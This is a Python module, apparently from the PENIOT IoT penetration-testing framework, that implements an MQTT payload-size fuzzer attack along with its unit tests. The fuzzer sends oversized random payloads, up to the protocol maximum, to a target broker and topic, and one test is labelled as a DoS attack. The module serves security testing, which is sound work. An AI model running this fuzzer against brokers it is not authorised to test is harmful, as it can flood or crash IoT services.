import paho.mqtt.client as paho

import multiprocessing
import logging
import random
import time
import signal
import unittest

from Entity.attack import Attack
from Entity.input_format import InputFormat
from Utils.RandomUtil import random_generated_names


class MQTTPayloadSizeFuzzerAttack(Attack):
    """
    MQTT Protocol - Payload Size Fuzzer Attack module
    It is created to test any MQTT device as black box test with malformed or semi-malformed inputs
    """
    client = None

    # Input Fields
    host = None
    topic = None
    fuzzing_turn = 10

    # Miscellaneous Members
    logger = None
    max_payload_length = 268435455
    sent_message_count = 0  # Transmitted fuzzing packets
    stopped_flag = False

    def __init__(self):
        default_parameters = ["127.0.0.1", "#", 10]
        inputs = [
            InputFormat("Broker Address", "host", "", str, mandatory=True),
            InputFormat("Topic Name", "topic", self.topic, str, mandatory=True),
            InputFormat("Fuzzing Turn", "fuzzing_turn", self.fuzzing_turn, int)
        ]

        Attack.__init__(self, "MQTT Payload Size Fuzzer Attack", inputs, default_parameters,
                        "    MQTT Payload size fuzzer attack description")

        logging.basicConfig(level=logging.DEBUG, format="%(asctime)s:%(levelname)s:%(name)s:%(message)s")

        # Signal handler to exit from function
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, sig, frame):
        self.stop_attack()

    def stop_attack(self):
        self.logger.info("Transmitted fuzzing packet count: {0}, exitting...".format(self.sent_message_count))
        self.stopped_flag = True
        if self.client is not None:
            self.client.disconnect()  # Close the connection before exitting
        time.sleep(2)  # Sleep one second so the user can see the message
        # sys.exit(0)

    def pre_attack_init(self):
        try:
            assert self.fuzzing_turn >= 2
        except AssertionError as e:
            raise
        self.client = paho.Client(random_generated_names.get_random_client_name())
        try:
            self.client.connect(self.host)
        except Exception as e:
            self.logger.error("Failed to connect to broker")

    def run(self):
        Attack.run(self)
        self.pre_attack_init()

        # Fill the size list as randomly generated
        size_list = [0, self.max_payload_length]
        size_list.extend([random.randint(0, self.max_payload_length) for _ in range(self.fuzzing_turn - 2)])

        fuzzing = 0
        self.logger.info("Size payload fuzzing is started. Please consider it may take some time.")
        for payload_size in size_list:

            if self.stopped_flag is True:  # An external interrupt can force us to finish the attack
                break
            # Create payload and send it
            random_strings = "".join([chr(_) for _ in range(65, 91)]) + "".join([chr(_) for _ in range(97, 123)])
            random_character = random.choice(random_strings)
            sized_payload = random_character * payload_size
            self.client.publish(self.topic, sized_payload)

            # Increment sent message count
            self.logger.info(
                "Turn {0} is completed and {1} bytes of message is sent.".format(fuzzing + 1, payload_size))
            self.sent_message_count += 1
            fuzzing += 1
            time.sleep(1)
        if self.stopped_flag is False:
            self.logger.info("Payload size attack is finished.")


class TestMQTTPayloadSizeAttack(unittest.TestCase):
    def setUp(self):
        self.mqtt_payload_size_fuzzer = MQTTPayloadSizeFuzzerAttack()

    def tearDown(self):
        pass

    def test_name(self):
        self.assertEqual("MQTT Payload Size Fuzzer Attack", self.mqtt_payload_size_fuzzer.get_attack_name())

    def test_inputs(self):
        inputs = self.mqtt_payload_size_fuzzer.get_inputs()
        self.assertIsNotNone(inputs)
        self.assertGreater(len(inputs), 0, "Non inserted inputs")
        self.assertEquals(len(inputs), 3)

    def test_non_initialized_inputs(self):
        inputs = self.mqtt_payload_size_fuzzer.get_inputs()
        for _input in inputs:
            value = getattr(self.mqtt_payload_size_fuzzer, _input.get_name())
            self.assertTrue(value is None or type(value) == _input.get_type())

    def test_after_getting_inputs(self):
        example_inputs = ["a.b.c.d", "peniot-coap-test", 8888]
        for index, _input in enumerate(example_inputs):
            self.mqtt_payload_size_fuzzer.inputs[index].set_value(_input)

        # Previously it should not be set
        self.assertIsNone(self.mqtt_payload_size_fuzzer.client)

        super(MQTTPayloadSizeFuzzerAttack, self.mqtt_payload_size_fuzzer).run()

        inputs = self.mqtt_payload_size_fuzzer.get_inputs()
        for index, _input in enumerate(inputs):
            value = getattr(self.mqtt_payload_size_fuzzer, _input.get_name())
            self.assertEqual(example_inputs[index], value)

    def test_invalid_fuzzing_turn(self):
        example_inputs = ["127.0.0.1", "peniot-topic", 1]
        for index, _input in enumerate(example_inputs):
            self.mqtt_payload_size_fuzzer.inputs[index].set_value(_input)

        super(MQTTPayloadSizeFuzzerAttack, self.mqtt_payload_size_fuzzer).run()
        try:
            self.mqtt_payload_size_fuzzer.pre_attack_init()
        except AssertionError as e:
            self.assertTrue(True)

    def test_payload_size_fuzzing_attack(self):
        def run_attack():
            example_inputs = ["127.0.0.1", "peniot/test", 3]
            for index, _input in enumerate(example_inputs):
                self.mqtt_payload_size_fuzzer.inputs[index].set_value(_input)

            try:
                self.mqtt_payload_size_fuzzer.run()
            except Exception as e:
                self.assertTrue(False)

        print "* If server is not initialized this test will not execute properly."
        p = multiprocessing.Process(target=run_attack, name="DoS Attack")
        p.start()
        time.sleep(5)
        if p.is_alive():
            p.terminate()
            p.join()


if __name__ == '__main__':
    unittest.main()
